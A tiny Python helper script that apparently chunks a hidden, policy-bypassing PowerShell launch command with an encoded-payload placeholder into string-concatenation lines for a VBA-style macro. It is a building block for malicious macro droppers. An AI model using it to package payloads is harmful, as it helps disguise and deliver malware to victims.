str = "powershell.exe -nop -exec bypass -w hidden -e ENCODED_PAYLOAD"

n = 50

for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
